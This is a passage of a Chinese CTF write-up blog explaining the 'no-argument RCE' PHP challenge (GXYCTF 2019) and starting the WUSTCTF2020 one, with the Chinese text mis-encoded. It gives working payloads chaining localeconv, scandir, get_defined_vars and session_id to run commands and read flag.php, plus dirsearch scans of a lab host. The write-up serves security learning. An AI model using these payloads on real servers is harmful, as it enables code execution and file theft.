invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//echo  hello</span><br> <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)*\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//echo  goodbye</span><br><br><span class="hljs-comment">//æ³¨æ„$açš„æ ¼å¼ï¼Œå¦‚æœæ˜¯å¾ˆæ ‡å‡†çš„ä¸€ä¸ªæ‹¬å·å¥—ç€ä¸€ä¸ªæ‹¬å·ï¼ša(b(c()))ï¼Œok,ç”¨è¿™ä¸¤ç§éƒ½æ²¡é—®é¢˜ï¼Œä½†ä½ å¦‚æœæœ‰çš„åœ°æ–¹å¥—äº†ä¸¤ä¸ªï¼ša(b()c())ã€‚é‚£ç¬¬ä¸€ç§å°±ä¸è¡Œäº†ï¼Œåªèƒ½ç”¨ç¬¬äºŒç§ã€‚æˆ‘ä¸ªäººç†è§£å°±æ˜¯?ä¸€ä¸ªå¥—ç€ä¸€ä¸ªè¿™æ ·æï¼Œä½†æ˜¯*å…è®¸ä¸€ä¸ªå¥—å¤šä¸ªã€‚æ„Ÿè§‰è¿™å°±æ˜¯é¢˜ç›®è¯´çš„å¥—å¨ƒï¼Ÿä¸€èˆ¬RCEéƒ½è¦ç»™æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ä¼ å‚ï¼Œæ¯”å¦‚eval(system(&#x27;ls&#x27;));ã€‚åŒ¹é…å®Œäº†ä¼šå¤šä¸ª&#x27;&#x27;å‡ºæ¥ã€‚</span><br>    <br></code></pre></td></tr></table></figure><p>ç»è¿‡è¿™ç§æ­£åˆ™åŒ¹é…åèƒ½è¿‡æ»¤çš„åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œå»ç½‘ä¸ŠæŸ¥äº†wpåŸæ¥è¿™æ˜¯ä¸€ç§å«<code>æ— å‚æ•°RCE</code>çš„é¢˜å‹(ç¬¬ä¸€æ¬¡è§)ã€‚ä¸‹é¢çš„å†…å®¹å‚è€ƒäº†è¿™ä¸¤ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢!</p><p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p><p><code>https://blog.csdn.net/weixin_46330722</code></p><p>æ— å‚æ•°RCEä¸€èˆ¬æœ‰ä¸‰ç§è§£æ³•ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.åˆ©ç”¨<span class="hljs-built_in">getallheaders</span>()å‡½æ•°ã€‚<br><span class="hljs-number">2</span>.åˆ©ç”¨<span class="hljs-built_in">get_defined_vars</span>()å‡½æ•°ã€‚<br><span class="hljs-number">3</span>.åˆ©ç”¨session_idå¸®åŠ©å‘½ä»¤æ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p>æ‹¿<code>getallheaders()</code>æ¥è¯´ï¼Œè¿™ä¸œè¥¿ä¼šä»¥æ•°ç»„å½¢å¼è¿”å›æ‰€æœ‰HTTPå¤´ä¿¡æ¯ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<span class="hljs-comment">//æ•°ç»„å½¢å¼æ‰€ä»¥æˆ‘ç”¨äº†var_dump</span><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/tw4.png" alt="tw4"></p><p>å¯ä»¥çœ‹åˆ°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›äº†HTTPæ•°æ®åŒ…çš„å¤´å’Œå¯¹åº”ä¿¡æ¯ï¼Œæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯è¿™ä¸œè¥¿æ˜¯å€’ç€å‡ºæ¥çš„ã€‚</p><p>æ•°ç»„å½¢å¼è‚¯å®šæ²¡æ³•ç”¨ï¼Œæƒ³ç»™<code>eval</code>å•¥çš„ä¼ å‚è‚¯å®šè¦æ˜¯ä¸ªå­—ç¬¦ä¸²ã€‚å¯ä»¥åˆ©ç”¨<code>implode</code>å‡½æ•°æŠŠæ•°ç»„å˜æˆå­—ç¬¦ä¸²ï¼Œçœ‹ä¸‹GPTå¯¹è¿™ä¸ªå‡½æ•°çš„è§£é‡Šï¼š</p><p><img src="/img/tw5.png" alt="tw5"></p><p>ä¸è¿‡è¿™ä¸ª$glueå¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œé»˜è®¤æ²¡ä¸œè¥¿ç›´æ¥ä¸²èµ·æ¥ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw6.png" alt="tw6"></p><p>ç°åœ¨å­—ç¬¦ä¸²ä¹Ÿå¾—åˆ°äº†ï¼Œæˆ‘ä¹ˆå¯ä»¥åœ¨ä¼ httpåŒ…çš„æ—¶å€™ç»™æ•°æ®åŒ…åº•ä¸‹åŠ ä¸ªå¤´æ¯”å¦‚ï¼š<code>renyi:system(&#39;whoami&#39;);//</code>è¾¾åˆ°æ‰§è¡Œä»»æ„å‘½ä»¤çš„ç›®çš„(åé¢è·Ÿç€æ³¨é‡Šç¬¦å·ï¼ŒæŠŠå…¶ä»–çš„æ³¨é‡Šæ‰äº†)ã€‚</p><p>ä¸è¿‡ç€è¿™ç§æ–¹æ³•æˆ‘æ²¡æˆåŠŸã€‚ã€‚ã€‚</p><p><code>get_defined_vars()</code>ï¼šè¿”å›æ‰€æœ‰å·²å®šä¹‰æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¸è¿‡è¿™ä¸ªå’Œ<code>getallheaders()</code>ä¸ä¸€æ ·ï¼Œå®ƒè¿”å›çš„æ˜¯å¤šç»´æ•°ç»„ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw7.png" alt="tw7"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿ä¼šæŠŠGETä¼ å…¥çš„å‚æ•°æ˜¾ç¤ºåœ¨ç¬¬ä¸€ä½</p><p><img src="/img/tw8.png" alt="tw8"></p><p>GETä¼ å…¥çš„å‚æ•°å¯æ§ï¼Œé‚£æˆ‘ä»¬è‚¯å®šå¸Œæœ›åœ¨è¿™ä¸ªå¤šç»´æ•°ç»„ä¸­å–å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼šåˆ©ç”¨<code>current</code>å‡½æ•°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>å‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ä¸­çš„å•å…ƒä¸”åˆå§‹æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚å› ä¸ºGETæ–¹å¼ä¼ å…¥çš„å‚æ•°å­˜åœ¨è¯¥äºŒç»´æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šæœè¿™ä¸ªå‡½æ•°å°†å…¶å–å‡ºæ¥<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw9.png" alt="tw9"></p><p><img src="/img/tw10.png" alt="tw10"></p><p>ä¼ ä¸¤ä¸ªå‚æ•°ä¹Ÿå¯ä»¥â†‘</p><p>å‡å¦‚æˆ‘ä»¬è¦ä¼ å…¥çš„æ¶æ„ä»£ç æ”¾åœ¨GETåé¢(ä¼ çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºäº†ç»•è¿‡ä¸€äº›ç‰¹å®šå‚æ•°çš„æ£€æµ‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ”¾æ¶æ„ä»£ç )ï¼Œé‚£ä¹ˆå¦‚ä½•é€šè¿‡<code>current(get_defined_vars())</code>æŠŠä»–å–å‡ºæ¥ï¼Ÿ</p><p>å¯ä»¥åˆ©ç”¨<code>end</code>å‡½æ•°(è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå•å…ƒçš„å€¼)ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/tw11.png" alt="tw11"></p><p>ç»•äº†ä¸ªå°å°çš„åœˆå­ï¼Œç°åœ¨å†™ä¸ªç®€å•çš„ä¸œè¥¿çœ‹çœ‹ä¸ºå•¥è¦é€šè¿‡ç¬¬äºŒç§æ–¹æ³•ä¼ ä¸¤ä¸ªå‚æ•°è¾¾åˆ°<code>RCE</code>çš„æ•ˆæœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„é€ payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p><p><img src="/img/tw12.png" alt="tw12"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†<code>system(phpinfo())</code>ã€‚è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ï¼š<code>eval(end(current(get_defined_vars())));</code>è¿™ä¸œè¥¿ä¸ºäº†è¿”å›æˆ‘ä»¬getä¼ è¿‡å»çš„æœ€åä¸€ä¸ªå‚æ•°çš„å€¼ã€‚æˆ‘ä¸€å¼€å§‹æ²¡åŠ evalæƒ³ç€å¤–é¢å·²ç»æœ‰ä¸ªevaläº†(å½“æ—¶äººæ™•äº†ï¼Œå“ˆå“ˆ)ï¼Œé‡Œé¢è¿™ä¸ªevalæ˜¯ä¸ºäº†æ‰§è¡Œè¿™äº›å¥—å¨ƒå‡½æ•°æŠŠæ¶æ„ä»£ç ç¿»å‡ºæ¥ï¼Œå¤–é¢çš„evalæ˜¯æ‰§è¡Œæ¶æ„ä»£ç ç”¨çš„ï¼Œä¸€æ¥ä¸€å›å°±ç›¸å½“äº<code>eval(system(phpinfo()))</code>äº†ã€‚è€Œä¸”è¿™ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥éšä¾¿æ„é€ ï¼Œåæ­£å®ƒåªæ£€æµ‹<code>exp</code>ã€‚</p><p>ç¬¬ä¸‰ç§æ–¹æ³•é€šè¿‡<code>session_id</code>æ‰§è¡Œæ¶æ„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ä½œç”¨æ˜¯è·å–å½“å‰ä¼šè¯çš„ID,ä¹Ÿå°±æ˜¯cookieä¸­çš„phpsessionï¼Œè¿™é‡Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œphpsessionä¸­åªå…è®¸å‡ºç° a-z A-Z 0-9 , - ç­‰å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œå¯ä»¥å…ˆå°†å…¶16è¿›åˆ¶ç¼–ç åå†æ’å…¥ã€‚</span><br>æµ‹è¯•ä»£ç ï¼š<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//å‚è€ƒäº†novic4å¸ˆå‚…çš„æ–‡ç« </span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/tw13.png" alt="tw13"></p><p>æ³¨æ„è¿™ä¸ªhex2binï¼Œä»–æ˜¯å­—ç¬¦ä¸²è½¬å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å­—è½¬æ•°å­—ã€‚</p><p>ç°åœ¨æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼š<code>phpsession</code>å¤´çš„å€¼æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå…ˆé€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>æŠŠæˆ‘ä»¬éœ€è¦çš„æ¶æ„ä»£ç ç¿»å‡ºæ¥ï¼Œç„¶åæŠŠå®ƒä¼ ç»™expå‚æ•°å°±è¡Œäº†(æ³¨æ„è¦æŠŠæ¶æ„ä»£ç è½¬æˆåå…­è¿›åˆ¶ï¼)ï¼š</p><p><code>å› ä¸ºæˆ‘åˆ°ç°åœ¨è¿˜æ²¡æ•´æ˜ç™½æ€ä¹ˆç”¨burpsuiteæŠ“æœ¬åœ°åŒ…ï¼Œæ‰€ä»¥ä¸‹é¢çš„å›¾å‚è€ƒäº†novic4å¸ˆå‚…çš„å›¾ï¼Œå†æ¬¡æ„Ÿè°¢ï¼</code></p><p><img src="/img/tw14.png" alt="tw14"></p><p>ç°åœ¨å›åˆ°è¿™ä¸ªå¥—å¨ƒé¢˜ï¼Œå·²çŸ¥è¿‡æ»¤äº†<code>et</code>ï¼Œ<code>hex</code>ç­‰ï¼Œä¼¼ä¹ä¸Šé¢ä¸‰ç§æ–¹æ³•éƒ½ç”¨ä¸äº†äº†ã€‚ã€‚ã€‚</p><p>çœ‹äº†å¸ˆå‚…ä»¬çš„wpï¼Œç¬¬ä¸€ä¸ªpayloadè¿™ä¹ˆå†™ï¼š</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>å…ˆçœ‹çœ‹è¿™ä¸ª<code>localeconv()</code>è¿”å›äº†ä»€ä¹ˆä¸œè¥¿ï¼š</p><p><img src="/img/tw17.png" alt="tw17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/tw15.png" alt="tw15"></p><p>ç¬¬ä¸€é¡¹è¿”å›äº†æˆ‘ä»¬æƒ³è¦çš„<code>.</code>ã€‚å†åˆ©ç”¨<code>current</code>è¿”å›ä¸€ç»´æ•°ç»„ç¬¬ä¸€é¡¹çš„å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw16.png" alt="tw16"></p><p>æ³¨æ„è¿™é‡Œå’Œå‰é¢é‚£ä¸ª<code>get_defined_vars</code>åŒºåˆ†å¼€ï¼Œäººå®¶è¿”å›çš„æ˜¯å¤šç»´æ•°ç»„ï¼Œç°åœ¨æˆ‘ä»¬åªè¿”å›äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥<code>current</code>ååªæœ‰ä¸€ä¸ªç‚¹ã€‚</p><p><code>scandir(&#39;.&#39;)</code>è¿™ä¸œè¥¿ä¼šä»¥æ•°ç»„å½¢å¼è¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw18.png" alt="tw18"></p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å…ˆé€šè¿‡<code>/?exp=var_dump(scandir(current(localeconv())));</code>çœ‹çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½æœ‰å•¥(var_dumpä¹Ÿèƒ½ç”¨<code>print_r</code>ç­‰ä»£æ›¿ï¼š</p><p><img src="/img/tw19.png" alt="tw19"></p><p>å¯ä»¥çœ‹åˆ°å€’æ•°ç¬¬äºŒä¸ªæ–‡ä»¶å°±æ˜¯flag.phpäº†ï¼Œæ„é€ payload:</p><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p>å› ä¸º<code>flag.php</code>åœ¨å€’æ•°ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥å…ˆ<code>array_reverse</code>æŠŠå®ƒè½¬æˆæ­£æ•°ç¬¬äºŒä¸ªï¼Œç„¶å<code>next</code>å°†æŒ‡é’ˆå‘ä¸‹ç§»åŠ¨ç›´æ¥æå–ç¬¬äºŒä¸ª(å‰é¢çš„<code>current</code>å°†æŒ‡é’ˆæ”¾åœ¨é¦–ä½)ã€‚</p><p><img src="/img/tw20.png" alt="tw20"></p><p>ä¹Ÿå¯ä»¥ç”¨<code>highlight_file()</code>å‡½æ•°æ›¿æ¢ï¼Œä»–ä¿©å·®ä¸å¤šã€‚</p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œæ¯”å¦‚è¿™ä¸ªflag.phpçš„ä½ç½®ä¸ç‰¹æ®Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">å¦‚æœflag.phpçš„ä½ç½®ä¸ç‰¹æ®Šï¼Œå¯ä»¥ä½¿ç”¨<span class="hljs-title function_ invoke__">array_rand</span>()å’Œ<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…<span class="hljs-title function_ invoke__">array_flip</span>()æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œå‡½æ•°ä½œç”¨ä¸Šé¢æœ‰å†™åˆ°)æ¥éšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹ï¼Œåˆ·å‡ æ¬¡å°±å‡ºæ¥äº†ï¼Œæ‰€ä»¥è¿™ç§æƒ…å†µpayloadï¼š<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-title function_ invoke__">array_rand</span>()è¿™ä¸œè¥¿ä¼šè¿”å›éšæœºä¸€ä¸ªé”®åï¼Œ<span class="hljs-title function_ invoke__">array_flip</span>()ç”¨äºäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼Œè¿™ä¸¤ä¸ªç»„åˆä¸€ä¸‹å°±ä¼šè·å¾—éšæœºçš„ä¸€ä¸ªé”®å€¼ã€‚å› ä¸ºè¿™ä¸œè¥¿å®Œå…¨éšæœºçš„ï¼Œæ‰€ä»¥å¤šåˆ·æ–°å‡ æ¬¡æ‰å¯èƒ½ä¼šå‡ºç°flagï¼    <br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•ä½¿ç”¨session_idï¼š</p><p>ä¸è¿‡æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†<code>hex</code>ï¼Œå‰é¢çš„<code>eval(hex2bin(session_id(session_start())));</code>è‚¯å®šæ²¡æ³•ç”¨äº†ï¼Œä¸è¿‡å¸ˆå‚…çš„åšå®¢é‡Œè¯´<code>PHPSESSIID</code>è¿™ä¸œè¥¿å¯ä»¥ç›´æ¥ç»™ä»–èµ‹å€¼<code>flag.php</code>ï¼š</p><p>payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>å¹¶åŠ ä¸ª<code>cookie</code>å¤´ï¼š<code>cookie:PHPSESSID=flag.php</code></p><p><img src="/img/tw21.png" alt="tw21"></p><p>ä»¥ä¸Šå†…å®¹å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ã€‚ã€‚</p><p><img src="/img/pswh1.png" alt="pswh1"></p><p>ç¡®å®å’Œé¢˜ç›®å¯¹åº”äº†ï¼Œå“ˆå“ˆã€‚ä»–è¿™ä¸ªæŠ¥é”™å¥½åƒæ˜¯ä¸ª</p><p>ä¸çŸ¥é“å¹²å•¥å°±ç”¨dirsearchæ‰«ï¼š<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>Kaliä¸‹ä¸ç”¨åŠ åé¢é‚£ä¸€ä¸²ï¼š<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p><p>æ‰«å‡ºæ¥ä¸¤ä¸ªä¸œè¥¿ï¼š<code>index.php</code>å’Œ<code>robots.txt</code>ï¼Œè®¿é—®<code>robots.txt</code>ï¼š</p><p><img src="/img/pswh2.png" alt="pswh2"></p><p><code>index.php</code>å°±æ˜¯è¿›å»è¿™ä¸ªç•Œé¢ï¼Œè®¿é—®ä¸‹è¿™ä¸ª<code>fAke_f1agggg.php</code>:</p><p><img src="/img/pswh3.png" alt="pswh3"></p><p>:(ï¼ŒburpsuiteæŠ“åŒ…çœ‹çœ‹ä»€ä¹ˆæƒ…å†µï¼š</p><p><img src="/img/pswh4.png" alt="pswh4"></p><p>èŠœæ¹–ï¼Œå“åº”åŒ…é‡Œæœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š<code>fl4g.php</code>ï¼Œç›´æ¥è®¿é—®ï¼š</p><p><img src="/img/pswh5.png" alt="pswh5"></p><p>è¿™é‡Œå‘ç°ä¸ªé—®é¢˜ï¼šé¡µé¢è¿”å›ä¸€å †ä¹±ç ï¼Œä½†æ˜¯æ”¾burpsuiteçš„repeateræ¨¡å—é‡Œçœ‹åˆä¸å­˜åœ¨ï¼Œå’Œä¸Šé¢é‚£æ®µ<code>php</code>æŠ¥é”™æœ‰å…³ç³»ï¼Ÿä¸å¤ªæ‡‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 